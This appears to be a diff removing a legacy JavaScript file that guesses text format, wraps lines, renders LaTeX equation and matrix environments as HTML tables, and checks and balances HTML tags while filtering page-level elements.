@@ -1,1234 +1,1 @@
-/************************************************************************** 
-* (C) Copyright 2004-2014 by Systems on Web, Inc.  All Rights Reserved.  *
-* Author: Zhongyan Lin                                                   *
-**************************************************************************/
-function keeptext2html(txt)
-{
-   return txt.replace(/ /g,'?').replace(/</g, "<").replace(/>/g,">").replace(/\n/g,'<br>');
-}
-
-function spaces(i)
-{
-   var sp='';
-   for (var ii = 0; ii < i; ii++)
-      sp += " ";
-   return sp; 
-}
-
-function foldlines(txt, max)
-{
-   var word  = txt.replace(/\n+/g, ' ');
-   return  foldaline(word, max, '\n');
-}
-
-function foldaline2(txt, max)
-{
-   if (txt==null) return ""; 
-   var lines = txt.split(/\n/);
-   var ans = '';  
-   for (var i=0; i < lines.length; i++)
-   {  
-      ans += foldaline(lines[i], max,'\n') +"\n";
-   }
-   return ans;  
-}
-
-function foldlines1(txt, max)
-{
-   var word  = txt.replace(/\n\n/g, '<br>');
-   return  foldaline(word, max, '<br>');
-   
-}
-
-function foldaline(p, m, ccc)
-{
-   var words = p.split(/[ |\n]/); 
-   var processed = "";
-   var j = 0, k;
-   for (var i = 0; i < words.length; i++)
-   {
-      k = words[i].length;
-      if (j+k < m)
-      {
-        processed += words[i] + " ";
-        j += (k+1);
-      }
-      else
-      {
-        if (processed.length != 0)
-          processed +=  ccc;
-        processed +=  words[i] + " ";
-        j = k;
-      } 
-   }
-   return processed;
-}
-
-function whichFormat(txt)
-{
-   return guessFormat(txt.value);
-}
-
-function guessFormat(txt)
-{ 
-   var ans = 0;
-   var i = 0; 
-   var dcounter = 0; 
-   var hcounter = 0;
-   var hasslash = false;
-   if (txt==null)
-   {
-       if (typeof(guessedFormat)!='undefined')guessedFormat=0;
-       return 0;
-   }
-   var xy;
-   var p1=-1,p2=0;
-   for (; i < txt.length; i++)
-   {
-     if (txt.charAt(i) == '$' && (i==0 || txt.charAt(i-1)!='\\'))
-     {
-        dcounter++; 
-        if (p1 == -1) 
-        {
-            p1 = i;
-        }
-        else  
-        {
-            if (  hasslash || i-p1 < 10 &&  (xy=txt.substring(p1,i)).indexOf(",")==-1 && xy.replace(/^[0-9|\.]+/,'')==xy    )
-            {
-                if (typeof(guessedFormat)!='undefined')
-                    guessedFormat=2;
-                return 2;
-            }
-            else 
-            { 
-                p1 = i;
-                hasslash = false;
-            }
-        }
-         
-     }
-     else  if ( p1>-1 && i>p1 && (txt.charAt(i)=='\\' &&  i < txt.length-1 && txt.charAt(i+1)!='$' ||txt.charAt(i)=='^'||txt.charAt(i)=='_')) 
-         hasslash = true;
-        
-   }
-   for (i=0; i < txt.length; i++)
-   {
-     if (txt.charAt(i) == '<') 
-     {
-         hcounter++;
-         if (hcounter>1 && i < txt.length-1 && txt.charAt(i+1) == '/')
-         {   
-             if (typeof(guessedFormat)!='undefined')guessedFormat=1;
-             return 1;
-         }
-     }
-   }
-   if (txt.replace(/[ |\n]/g,'')!='' && txt.replace(/^[ ]*\n*http[s]?:[^ ]+[ ]*\n*/,'')=='')
-   {  
-       if (typeof(guessedFormat)!='undefined')guessedFormat=3;
-       return 3;
-   }
-   var r = new RegExp(/<[ ]*[a-z]+[^>]+>/i);
-   var m = r.exec(txt);
-   if (m != null)
-   {
-       var x = m.toString().toLowerCase().replace(/<[ ]*/,'');
-       
-       var y = x.replace(/[^a-z]/,' ');
-     
-       var j = y.indexOf(" ");
-   
-       y = "," + y.substring(0, j) + ",";
-     
-       if (",br,li,img,input,hr,meta,link,area,param,iframe,".indexOf(y)>=0)
-       {
-           if (typeof(guessedFormat)!='undefined')guessedFormat=1;
-           return 1;
-       }
-   }
-   if (typeof(guessedFormat)!='undefined')guessedFormat=1;
-   return 0;
-}
- 
-function checkHTML(txt)
-{ 
-   if (txt!=null) txt.value =  checkh(txt.value,true );
-}
-
-function noneedclose(str)
-{
-    return (str=='img' || str == 'br' || str  == 'hr' || str == 'input' || str=='meta' || str=='frame' || str=='iframe' || str=='li' || str =='link'   )
-}
-
-function dd(txtstr)
-{
-  if (txtstr==null ) return null;
-  var arr = new Array();
-  var dd = new RegExp(/\$[^\$]+\$/);
-  var k =0;
-
-  while ( k < txtstr.length )
-  {
-
-      var m  = dd.exec(txtstr.substring(k));
-
-      if (m  == null  )
-      {
-         break;
-      }
-      arr[arr.length] = [k + m.index, k+m.index+m.toString().length];
-      k += m.index+m.toString().length;
-  }
-  return arr;
-}
-function indd(k, arr )
-{
-    if (arr== null) return -1;
-    for (var i=0; i < arr.length; i++)
-    if (k>=arr[i][0] && k <=arr[i][1])
-        return arr[i][1];
-    return -1;
-}
-
-function Astack()
-{
-    this.st = new Array();
-    this.len = 0;
-    this.push = function(x)
-    {
-        this.st[this.len++] = x;
-    }
-    this.pop  = function()
-    {
-        if (this.len > 0)
-           this.len--;
-    }
-    this.get  = function()
-    {
-       if (this.len == 0) return null;
-       return this.st[this.len-1];
-    }
-    this.size = function()
-    {
-        return this.len;
-    }
-}
-var transition =
-[
-[1,0,0,9,0,13,0,0,0,0,0],
-[1,0,6,9,0,0,0,2,0,0,0],
-[1,4,3,9,7,0,2,2,2,2,0],
-[1,0,0,9,0,0,0,0,0,0,0],
-[5,4,4,9,4,4,4,4,4,4,4],
-[5,4,6,9,4,4,4,2,4,4,4],
-[5,0,4,9,4,4,6,6,6,4,4],
-[7,7,7,7,2,8,7,7,7,7,7],
-[7,7,7,7,7,8,7,7,7,7,7],
-[11,11,11,10,11,11,11,11,11,11,11],
-[10,10,10,12,10,10,10,10,10,10,10],
-[11,11,11,14,11,11,11,11,11,11,11],
-[14,14,14,14,14,14,14,14,14,14,14],
-[1,0,0,0,0,0,0,0,0,0,0]
-];
-
-function mapcode(c)
-{
-    switch(c)
-    {
-        case  '<':return 0;
-        case  '>':return 1;
-        case  '/':return 2;
-        case  '$':return 3;
-        case  '"':return 4;
-        case  '\\':return 5;
-        case  ' ': case  '\n': case  '\r':return 6;
-        case  '=':return 9;
-        default:
-           if ('a' <= c && c <= 'z' || 'A' <= c && c <= 'Z')
-               return 7;
-           else if ('0' <= c && c <= '9')
-               return 8;
-           return 10;
-    }
-    return 10;
-   
-}
-var noneedmatchs=['br','li','img','input','hr','meta','link', 'area', 'param', 'iframe'];
-var harmfuleles = ',head,title,meta,link,';
-var harmfultags = ',html,body,';
-function nnmatch(x)
-{
-    if (x==null) return true;
-    for (var i=0; i < noneedmatchs.length; i++)
-        if (x.toLowerCase() == noneedmatchs[i])
-           return true;
-   return false;
-}
-function removecm(txtstr)
-{
-   var y = '';
-   var i, j = 0;
-   while (true)
-   {
-       i = txtstr.indexOf("<!--", j);
-       if (i == -1)
-       {
-           y += txtstr.substring(j);
-           break;
-       }
-       else
-       {
-           y += txtstr.substring(j, i);
-       }
-       j = txtstr.indexOf("-->", i+4);
-       if (j < 0)
-       {
-           break;
-       }
-       else
-       {
-           j += 3;
-       }
-   }
-   return y;
-
-}
-function checkh1(txtstr, modify)
-{
-    //txtstr = removecm(txtstr);
-    var st = new Astack() 
-    var s = 0, saveds = 0;
-    var buf = "";
-    var y = '',z;
-    var nls = 0;
-    for (var i=0; i < txtstr.length; i++)
-    {
-        z = txtstr.charAt(i);
-        var c = mapcode(z);
-        var t = transition[s][c];
-        if (nls == 0 )
-        {
-            if( z == '\n')
-            nls = 1;
-        }
-        else if (nls == 1)
-        {
-            if (z == '\n')
-            {
-                if (modify) y += "<br>";
-                nls = 0;
-            }
-            else if (c != 6) 
-                nls = 0;
-        }
-        
-
-        if (t == 14)t =saveds;
-        if (c==0&& ( s < 7 || s ==13))
-        {
-            buf =  '';
-            if (modify) y +=z;
-        }
-        else if (c==7 && (s == 1 || s == 5))
-        {
-            buf += z;
-            if (modify) y +=z;
-        }
-        else if ( s == 2||s==6  )
-        {
-            if ( c ==1 )
-            {
-            
-            buf = buf.replace(/ .*/,'');
-            if (s == 6)
-            {
-                if (nnmatch(this.st.get()))
-                    this.st.pop();
-                if (buf.toLowerCase() ==  this.st.get().toLowerCase())
-                    this.st.pop();
-                else if (modify)
-                {
-                    var j = y.lastIndexOf(buf);
-                    while (y.charAt(j) != '<')j--;
-                    y = y.substring(0,j);
-                    
-                }
-            }
-            else
-            {
-                this.st.push(buf);
-            }
-           }
-           else if ( c >= 6 && c<=8 )
-           {
-               buf += z;
-           }
-           if (modify) y += z;
-        }
-        else if (c == 3 && s < 7)
-        {
-            if (s < 4)
-                saveds = 0;
-            else
-                saveds = 4;
-        }
-        else if (modify)
-        {
-        if (s == 9)
-        {
-            if (c == 3)
-            {
-                y += '<div>$'
-            }
-            else
-            {
-                y += '<span>$' + z;
-            }
-        }
-        else if (s == 10)
-        {
-            if (c != 3)
-            {
-                y += z;
-            }
-        }
-        else if (s == 11)
-        {
-            if (c == 3)
-            {
-                y += '$</span>';
-            }
-            else
-                y += z;
-        }
-        else if (s == 12)
-        {
-            y += '$</div>';
-            if (c!=3)
-                y += z;
-        }
-        else
-        {
-            y += z;
-        }
-        }
-        s = t;
-    }
-     
-    var w = '';
-
-    while( (z = st.get()) != null)
-    {
-       if (nnmatch(z)==false)
-           w += "</" + z + ">";
-        st.pop();
-    }
-    if (modify)
-    return  dobeginend(y) + w;
-    return w;
-}
-function dobeginend(t)
-{
-   if (t==null||t.length<6) return t;
-   var inside = [t.charAt(0)=='$'?1:0];
-   
-   for (var i=1; i < t.length; i++)
-   {
-      if (t.charAt(i) == '$')
-      {
-          if ( inside[i-1] == 1)  inside[i] = 2;
-          else if (inside[i-1] == 0)inside[i] == 1;
-          else inside[i] = 1;
-      }
-      else
-      {
-          if ( inside[i-1] == 1)  inside[i] = 0;
-          else if (inside[i-1] == 0)inside[i] == 0;
-          else inside[i] = 2;
-      }
-   }
-   var referlabels = new Array();
-   var equnum = 1;
-   var n=0;
-   var y = '';
-   var i = 0;
-   var block;
-   while (true)
-   {
-       
-      var cs = 0;
-      var kk = n;
-      while (true)
-      {
-         i = t.indexOf("\\begin{", kk);
-         if (i <0 || inside[i] == 0) break;
-         kk = i+6;
-      } 
-      if (i >= 0)
-      {
-          var j = t.indexOf("}", i+7);
-          if (j > 0)
-          {
-              block = t.substring(i+7, j);
-              if (block == 'equation')       cs = 1;
-              else if (block == 'eqnarray')  cs = 2;
-              else if (block == 'eqnarray*') cs = 3;
-              else if (block == 'array')     cs = 4;
-              else if (block == 'pmatrix')   cs = 5;
-              else if (block == 'vmatrix')   cs = 6;
-          }
-      }    
-       
-      
-      if ( cs == 1)
-      {
-          j = t.indexOf("\\end{equation}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{equation} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            var k = t.indexOf("\\label{",i);
-            if ( k >0 && k < j)
-            {
-               var m = t.indexOf("}", k+7);
-               if (m < 0) m = j;
-                  var lab = t.substring(k + 7, m);
-               
-               if (referlabels[lab] != null)
-               {
-                  return t.substring(0,i) + "<font color=red>duplicate label "+ lab + "</font> "+ t.substring(i) ;
-                  
-               }
-               referlabels[lab] = equnum;
-               
-               block = t.substring(i+16, k);
-               if ( m+1 < j) block += t.substring(m+1,j);
-            }
-            else
-               block = t.substring(i+16, j);
-            y += t.substring(n, i) + "<table  ><tr><td>("+ (equnum++) + ") </td><td align=left>$"+ block +"$</td></tr></table>";
-         }
-         n = j + 14;
-      }
-      else if ( cs == 2)
-      {
-         j = t.indexOf("\\end{eqnarray}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{eqnarray} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            y += t.substring(n, i) + "<table  >";
-            var arr = t.substring(i+16, j).split(/\\\\/);
-            for (var l=0; l < arr.length; l++)
-            {
-                k = arr[l].indexOf("\\label{");
-               if ( k >0 )
-               {
-                  m = arr[l].indexOf("}", k+6);
-                  if (m < 0) m = arr[l].length;
-                  lab = arr[l].substring(k + 7, m); 
-                  if (referlabels[lab] != null)
-                  {
-                     return t.substring(0,i) + "<font color=red>duplicate label "+ lab + "</font> "+ t.substring(i) ;
-                  }
-                  referlabels[lab] = equnum;
-                  block = arr[l].substring(0, k);
-                  if ( m < arr[l].length-1) block += arr[l].substring(m+1);
-                     
-               }
-               else
-               {
-                  block = arr[l];
-               }
-               var barr = block.split(/&/);
-               if (barr.length < 3)
-               {
-                   return t.substring(0,i) + "<font color=red>Need two & in : "+ arr[l] + "</font>" + t.substring(i) +"</font>";
-
-               }
-               y += "<tr><td>";
-               if (block.indexOf("\\nonumber") < 0)
-                  y+= "("+ (equnum++) + ")";
-               y += " </td><td align=right>$"+ barr[0] + "$</td><td align=center>$"+ barr[1] + "$</td><td align=left>$"+ barr[2] + "$</td></tr>";
-               
-               
-            }
-            y += "</table>";
-         }
-         n = j + 14;
-         
-      }
-      else if ( cs == 3)
-      {
-         j = t.indexOf("\\end{eqnarray*}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{eqnarray*} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            y += t.substring(n, i) + "<table  >";
-            arr = t.substring(i+17, j).split(/\\\\/);
-            for (l=0; l < arr.length; l++)
-            {
-               k = arr[l].indexOf("\\label{");
-               if ( k >0 )
-               {
-                  m = arr[l].indexOf("}", k+6);
-                  if (m < 0) m = arr[l].length;
-                     
-                  block = arr[l].substring(0, k);
-                  if ( m < arr[l].length-1) block += arr[l].substring(m+1);
-                     
-               }
-               else
-               {
-                  block = arr[l];
-               }
-               barr = block.split(/&/);
-               if (barr.length < 3)
-               {
-                   return t.substring(0,i) + "<font color=red>Need two & in : "+ arr[l] + "</font>" + t.substring(i) +"</font>";
-
-               }
-               y += "<tr><td align=right>$"+ barr[0] + "$</td><td align=center>$"+ barr[1] + "$</td><td align=left>$"+ barr[2] + "$</td></tr>";
-               
-            }
-            y += "</table>";
-         }
-         n = j + 15;
-         
-      }
-      else if ( cs == 4)
-      {
-         j = t.indexOf("\\end{array}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{array} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            m = t.indexOf("{", i+13);
-            if (m <0 || m >j)
-            {
-               return t.substring(0,i) + "<font color=red>NO  {alignment} such as {ccc} FOUND: "+ t.substring(i) +"</font>";
-               
-            }
-            l = t.indexOf("}", m+1);
-            if (l < 0 || l > j)
-            {
-               return t.substring(0,i) + "<font color=red> {alignment} not closed: "+ t.substring(i) +"</font>";
-            }
-            var aligns = t.substring(m+1, l).replace(/\s/g,'').split( "" );
-            
-            y += t.substring(n, i) + "<span style=\vertial-align:middle\"><table style=\"display:inline;vertial-align:middle\">";
-            arr = t.substring(l+1, j).split(/\\\\/);
-            for (l=0; l < arr.length; l++)
-            {
-               y += "<tr>";
-               barr = arr[l].split(/&/);
-               if (barr.length < 2)
-               {
-                 //  return t.substring(0,i) + "<font color=red>Need some &  as delimiter in : "+ arr[l] + "</font>" + t.substring(i) +"</font>";
-
-               }
-               for (var r=0; r < barr.length; r++)
-               {
-                  var alignstr = "center";
-                  if (aligns[r] == 'l')
-                     alignstr = "left";
-                  else if (aligns[r] == 'r')
-                     alignstr = "right";
-                  y += "<td align="+ alignstr +">$"+ barr[r] + "$</td>";
-               }
-               y += "</tr>";
-               
-            }
-            y += "</table></span>";
-         }
-         n = j + 11;
-      }
-      else if ( cs == 5)
-      {
-         j = t.indexOf("\\end{pmatrix}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{pmatrix} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            
-            y += t.substring(n, i) + "<span style=\vertial-align:middle\"><table  style=\"display:inline;vertial-align:middle\">";
-            arr = t.substring(i+15, j).split(/\\\\/);
-            y += "<tr><td rowspan=" + arr.length +"><img width=" + (2+(arr.length*3)) +" style=border:0px height=\"100%\" src=image/lbpar.png></td>";
-            for (l=0; l < arr.length; l++)
-            {
-               if (l>0) y += "<tr>";
-               barr = arr[l].split(/&/);
-               if (barr.length < 2)
-               {
-                  // return t.substring(0,i) + "<font color=red>Need some &  as delimiter in : "+ arr[l] + "</font>" + t.substring(i) +"</font>";
-               }
-               for (r=0; r < barr.length; r++)
-               {
-                  y += "<td align=center>$"+ barr[r] + "$</td>";
-               }
-               if (l == 0)
-                   y += "<td rowspan=" + arr.length +"><img width=" + (2+(arr.length*3)) +"  style=border:0px height=\"100%\" src=image/rbpar.png></td>";
-               y += "</tr>";
-               
-            }
-            y += "</table></span>";
-         }
-         n = j + 13;
-      }
-      else if ( cs == 6)
-      {
-         j = t.indexOf("\\end{vmatrix}",i);
-         if (j < 0)
-         {
-            return t.substring(0,i) + "<font color=red>NO \\end{vmatrix} FOUND: "+ t.substring(i) +"</font>";
-         }
-         else
-         {
-            
-            y += t.substring(n, i) + "<span style=\vertial-align:middle\"><table  style=\"display:inline;vertial-align:middle\">";
-            arr = t.substring(i+15, j).split(/\\\\/);
-            y += "<tr><td rowspan=" + arr.length +" style=\"padding:0px 0px 0px 0px\"  bgcolor=black width=1><img src=image/vertbar.png width=1 height=1></td>";
-            for (l=0; l < arr.length; l++)
-            {
-               if (l>0) y += "<tr>";
-               barr = arr[l].split(/&/);
-               if (barr.length < 2)
-               {
-                 //  return t.substring(0,i) + "<font color=red>Need some &  as delimiter in : "+ arr[l] + "</font>" + t.substring(i) +"</font>";
-               }
-               for ( r=0; r < barr.length; r++)
-               {
-                  y += "<td align=center>$"+ barr[r] + "$</td>";
-               }
-               if (l == 0)
-                   y += "<td rowspan=" + arr.length +"  style=\"padding:0px 0px 0px 0px\"   bgcolor=black width=1><img src=image/vertbar.png width=1 height=1></td>";
-               y += "</tr>";
-               
-            }
-            y += "</table></span>";
-         }
-         n = j + 13;
-      }
-      else
-      {
-         y += t.substring(n);
-         break;
-      }
-       
-   }
-   
-   
-   var w = '';
-   n =0;
-   
-   while (true)
-   {
-      i = y.indexOf("\\ref{", n);
-      if (i < 0)
-      {
-         w += y.substring(n);
-         break;
-      }
-      j = y.indexOf("}", i);
-      if (j == -1)
-      {
-        return y.substring(0,i) + "<font color=red>NO closing } FOUND: "+ t.substring(i) +"</font>";
-         
-      }
-      var ref = referlabels[y.substring(i+5, j)];
-      if (ref == null)
-      {
-         return y.substring(0,i) + "<font color=red>"+ y.substring(i+5, j) +" NOT A LABEL. "+ t.substring(i) +"</font>";
-      }
-      w += y.substring(n, i) + "("+ ref +")";
-      n = j+1;
-      
-   }
-   
-   return w;
-}
-
-function HTMLChecker(txtstr)
-{
-    this.st = new Astack();
-    this.x = txtstr;
-    this.pos = 0;
-    this.type = 'txt';
-    this.thisstart = -1;
-    this.thisend = -1;
-    this.corrected = '';
-    this.newt = '';
-    this.msg = '';
-    this.ident = 0; 
-    
-    this.harmfulele = 0;
-    this.harmfultag = false;
-    this.tag = '';
-    this.ele = function()
-    {
-        var s = 0;
-        var buf = '';
-        while (this.pos < this.x.length)
-        {     
-            var z = this.x.charAt(this.pos);
-            if (z == '<')
-            {
-                if (s == 0 )
-                {
-                    this.thisstart = this.pos;
-                    s = 1;
-                    buf = '';
-                }
-                else if (s == 1 )
-                {
-                    this.thisstart = this.pos;
-                    buf = '';
-                }
-
-            }
-            else if (z == '"')
-            {
-                if (s == 1)
-                {
-                    s = 2;
-                }
-                else if (s == 2) 
-                {
-                    if (this.pos>0 && txtstr.charAt(this.pos-1)!='\\')
-                        s = 1;
-                }
-            }
-            else if (z == '>')
-            {
-                if (s == 1)
-                {
-                    this.thisend = ++this.pos;
-                    return true;
-                   
-                    s = 0;
-                }
-            }
-            else
-            {
-                if (s == 1 )
-                {
-                    if (this.pos - this.thisstart == 3 && this.x.substring(this.thisstart+1,this.pos+1) == '!--')
-                    {
-                        var j = this.x.indexOf("-->", this.pos+1);
-                        if (j > 0)
-                        {
-                            this.thisend = this.pos = j + 3;
-                            return true;
-                        }
-                        else
-                        {
-                            return false;
-                        }
-                    }
-                } 
-            }
-            this.pos++; 
-        }
-        return false;
-    }
-    this.ishtml = function(y)
-    {
-         y = "," + y.toLowerCase() + ",";
-         return ",a,abbr,address,area,article,aside,audio,b,base,bdi,bdo,blockquote,body,br,button,canvas,caption,cite,code,col,colgroup,command,datalist,dd,del,details,dfn,dir,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,font,form,h1,h2,h3,h4,h5,h6,head,header,hgroup,hr,html,i,iframe,img,input,ins,kbd,keygen,label,legend,li,link,map,mark,menu,meta,meter,nav,nobr,noscript,object,ol,optgroup,option,output,p,param,pre,progress,q,rp,rt,ruby,s,samp,script,section,select,small,source,span,strong,style,sub,summary,sup,table,tbody,td,textarea,tfoot,th,thead,time,title,tr,track,u,ul,var,video,wbr,".indexOf(y)>=0;
-    }
-    this.nofolder = function(y)
-    {
-        y = "," + y.toLowerCase() + ",";
-        return ",a,b,body,br,caption,div,dd,dl,dt,em,font,h1,h2,h3,h4,h5,h6,hr,i,mark,nobr,option,p,pre,small,span,strong,td,th,sub,sup,".indexOf(y)>=0;
-    }
-                  
-    this.lastopen = '';
-    this.lastclose = '';
-    this.proctag = function()
-    {
-        var x1 = this.x.substring(this.thisstart, this.thisend);
-        var x = x1.replace("^<[ ]+", "<");
-        var y = '';
-        if (x.charAt(1) == '!' || x.charAt(1) == '>')
-        {    
-            this.type = 'txt';
-            this.corrected = x1;
-            
-        }
-        else if (x.charAt(1) == '/')
-        {
-            y = x.replace(/<.([a-z|A-Z|0-9]+)/,'$1 ');
-            if (y != x)
-            {
-                y = y.substring(0, y.indexOf(" "));
-                this.lastclose = y.toLowerCase();
-            }
-            if (y == x)
-            {
-                this.type = 'txt';
-                this.corrected = x1;
-            }
-            else if (this.ishtml(y))
-            {
-                var getmatched = false;
-                var w;
-                while ( (w = this.st.get()) != null)
-                {
-                    if (y.toLowerCase() == w.toLowerCase())
-                    {
-                        this.st.pop();
-                        this.corrected = x;
-                        this.type = 'endtag';
-                        getmatched = true;
-                        if (!nnmatch(y)) this.ident--;
-                        break;
-                    }
-                    if (nnmatch(w))
-                    {
-                        this.st.pop();
-                        if (w.toLowerCase() == 'iframe' || w.toLowerCase() == 'meta' || w.toLowerCase() == 'link')
-                        {
-                            this.harmfulele--;
-                        }
-                    } 
-                    else
-                    {
-                        break;
-                    }
-                }
-                
-                if (!getmatched)
-                {
-                     this.corrected = x1; 
-                     this.type = 'err';
-                }
-                if (harmfultags.indexOf(','+y.toLowerCase() +',') >= 0)
-                {
-                    this.corrected = this.corrected.replace(/</,'&lt;');
-                }
-            }
-            else
-            {
-                this.corrected = x1; 
-                this.type = 'txt';
-            }
-        }
-        else   
-        {
-            y = x.replace(/<([a-z|A-Z|0-9]+)/,'$1 ');
-            if (y!=x)
-            {
-                y = y.substring(0, y.indexOf(" "));
-                this.lastopen = y.toLowerCase();
-            }
-            if ( y == x)
-            {
-                this.corrected = x1;
-                this.type = 'txt';
-            }
-             
-            else if (this.ishtml(y))
-            {
-                 this.isscript = (y.toLowerCase() == 'script');
-                  
-                 if (x1.charAt(x1.length-2) != '/')
-                 {
-                    this.st.push(y);
-                    this.type = 'tag';
-                    if (!nnmatch(y)) this.ident++;
-                 }
-                 else 
-                     this.type = 'ctag';
-                 this.corrected = x;
-                 if (harmfuleles.indexOf(','+y.toLowerCase() +',') >= 0)
-                {
-                    this.harmfulele++;
-                }
-                else if (harmfultags.indexOf(','+y.toLowerCase() +',') >= 0)
-                {
-                    this.corrected = '';//this.corrected.replace(/</,'&lt;');
-                    this.harmfultag = true;
-                    this.harmfulel = 0;
-                }
-            }
-            else 
-            {
-                this.corrected = x1;
-                this.type = 'txt';
-            }
-        }
-        if (y.toLowerCase() == 'style' || y.toLowerCase() == 'script')
-            this.corrected = this.corrected.replace(/</, '&lt;').replace(/>/, '&gt;');
-        else
-            this.corrected = this.corrected.replace(/^[ ]+/,'');
-        return y;
-    }
-    this.padtab = function(n)
-    {
-        var s = '';
-        for (var i=0; i < n; i++)
-           s += '\t';
-       return s;
-    }
-    this.onechardiff = function (x,y)
-    {
-        if (y == null || x == null) return false;
-        var x1 = x, y1 = y;
-        for (var i=0; i < x.length; i++)
-            y1 = y1.replace(x.charAt(i),'');
-        for (var i=0; i < y.length; i++)
-            x1 = x1.replace(y.charAt(i),'');
-        return x1.length  <= 1 && y1.length  <= 1;
-    }
-    
-    this.html = function(w)
-    {
-        return w.replace(/\t/g,"&nbsp;&nbsp;&nbsp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/ /g, "&nbsp;").replace(/\r\n/g, "<br>").replace(/\r/g, "<br>").replace(/\n/g, "<br>");
-    }
-    this.trim = function(x)
-    {
-        if (x == null) return "";
-        var i=0; 
-        while (i < x.length && (x.charAt(i) == ' ' || x.charAt(i) == '\t'||x.charAt(i) == '\n' || x.charAt(i) == '\r')) i++;
-        if (i == x.length) return "";
-        var j= x.length - 1;
-        while (j >= 0 && (x.charAt(j) == ' ' || x.charAt(j) == '\t'||x.charAt(j) == '\n' || x.charAt(j) == '\r')) j--;
-        return x.substring(i, j+1);
-    }
-    this.canfolder = false;
-     
-    this.parse = function()
-    {
-        if (this.x == null) return;
-        var ans1= false;
-        while (true)
-        {
-            var ps = this.pos;
-            var b =  this.ele();
-            if (b == false)
-            {
-                
-                this.newt += this.x.substring(ps);
-                this.msg += this.html(this.x.substring(ps));
-                break;
-            }
-            var w = this.x.substring(ps, this.thisstart);
-            var hasspace=false, hasnewl = false;
-            var jj=-1; while (++jj < w.length) if (w.charAt(jj) == ' '||w.charAt(jj) == '\t') hasspace = true; else if (w.charAt(jj) == '\n' || w.charAt(jj) == '\r') hasnewl = true;else break;
-            if (hasnewl) w = '\n' + w.substring(jj);
-            else if (hasspace) w = ' ' + w.substring(jj);
-            hasspace=false; hasnewl = false;
-            var jj=w.length; while (--jj >= 0) if (w.charAt(jj) == ' '||w.charAt(jj) == '\t') hasspace = true; else if (w.charAt(jj) == '\n'|| w.charAt(jj) == '\r') hasnewl = true;else break;
-            if (hasnewl) w =   w.substring(0,jj+1) + '\n';
-            else if (hasspace) w = w.substring(0,jj+1) + ' ';
-            
-            if (this.harmfulele == 0 && w != '')
-            { 
-                
-                this.newt += w;
-                this.msg += this.html(w);
-            }
-            var y = this.proctag(); 
-            var xx = 0;
-             
-            if (this.type == 'txt')
-            {
-                if (this.harmfulele==0)
-                {
-                    if (this.canfolder)
-                    {
-                        if (this.newt.replace(/\n[ ]+$/,'') != this.newt) this.newt += "\n"; 
-                        this.newt +=   this.padtab(xx) + this.corrected;  
-                        this.msg += this.html("\n" + this.padtab(xx) + this.corrected);
-                    }
-                    else
-                    {
-                        this.newt += this.corrected;
-                        this.msg += this.html( this.corrected);
-                    }
-                }
-            }
-            else if (this.type == 'tag'|| this.type == 'ctag' )
-            {
-                xx = this.ident-1;
-                if (nnmatch(this.st.get()))
-                {
-                    xx++;
-                }
-                if (this.trim(w) != '' )
-                {
-                    if (this.canfolder)
-                    {
-                        if ( this.harmfulele==0 && !this.harmfultag)
-                        {
-                         if (this.newt.replace(/\n[ ]+$/,'') != this.newt) this.newt += "\n";
-                         this.newt +=   this.padtab(xx) + this.corrected; 
-                         this.msg +=  this.html(  "\n" + this.padtab(xx) + this.corrected);
-                        }
-                         
-                    }
-                    else
-                    {
-                        if (this.harmfulele==0 && !this.harmfultag)
-                        {
-                        this.newt +=  this.padtab(xx) + this.corrected;
-                        this.msg +=  this.html( this.padtab(xx) + this.corrected);
-                        }
-                    }
-                }
-                else if (this.canfolder || w != '')
-                {
-                    if (this.harmfulele==0 && !this.harmfultag)
-                    {
-                        if (this.newt.replace(/\n[ ]+$/,'') != this.newt)  this.newt += "\n";
-                        this.newt +=   this.padtab(xx) + this.corrected; 
-                        this.msg += this.html("\n" + this.padtab(xx) + this.corrected);
-                    }
-                }
-                else  
-                {
-                    if (this.harmfulele==0 && !this.harmfultag)
-                    {
-                        if (this.newt.replace(/\n[ ]+$/,'') != this.newt)  this.newt += "\n";
-                        this.newt +=  this.corrected;
-                        this.msg += this.html(  this.corrected);
-                    }
-                }
-                
-                if (this.type == 'ctag' && harmfuleles.indexOf(','+y.toLowerCase() +',') >= 0)
-                    this.harmfulele--;
-                this.canfolder  = (this.nofolder(this.lastopen) == false);
-            }
-            else if (this.type == 'endtag')
-            {
-                if ( (w.indexOf("\n") < 0 && w.indexOf("\r")<0) && this.lastclose.toLowerCase() == this.lastopen.toLowerCase())
-                {
-                    if (this.harmfulele==0 && !this.harmfultag)
-                    {
-                    this.newt +=   this.corrected;
-                    this.msg +=  this.html(  this.corrected);
-                    }
-                }
-                else  if (this.trim(w) == '')
-                {  
-                    if (this.harmfulele==0 && !this.harmfultag)
-                    {
-                    if (this.canfolder)
-                    {
-                        if (this.newt.replace(/\n[ ]+$/,'') != this.newt) this.newt += "\n";
-                        this.newt +=   this.padtab(this.ident) + this.corrected; 
-                        this.msg +=  this.html( "\n" + this.padtab(this.ident) + this.corrected);
-                    }
-                   else 
-                    {
-                        this.newt +=     this.corrected;
-                        this.msg +=  this.html(   this.corrected);
-                    }
-                    }
-                }
-                else  
-                {
-                    if (this.harmfulele==0 && !this.harmfultag)
-                        {
-                    if (this.canfolder)
-                    {
-                        if (this.newt.replace(/\n[ ]+$/,'') != this.newt)  this.newt += "\n";
-                        this.newt +=   this.padtab(this.ident) + this.corrected; 
-                        this.msg +=  this.html(  "\n" + this.padtab(this.ident) + this.corrected);
-                    }
-                    else
-                    {
-                        this.newt +=      this.corrected;
-                        this.msg +=  this.html(  this.corrected);
-                    }
-                        }
-                }
-                if (harmfuleles.indexOf(','+y.toLowerCase() +',') >= 0)
-                {
-                    this.harmfulele--;
-                }
-                
